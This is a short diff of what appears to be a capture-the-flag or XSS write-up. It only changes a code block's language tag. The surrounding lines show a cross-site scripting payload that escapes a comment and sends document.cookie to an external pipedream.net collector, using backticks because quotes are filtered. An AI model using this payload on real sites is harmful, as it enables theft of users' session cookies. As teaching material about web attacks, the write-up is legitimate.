@@ -10,7 +10,7 @@ Host a sever pipedream and send request
 
 Note: **' , "** filted so we use \`
 
-```text
+```javascript
 payload = */ new Image().src=`https://enz92o3d70fhjpm.m.pipedream.net?c=`+document.cookie /*
 ```
 
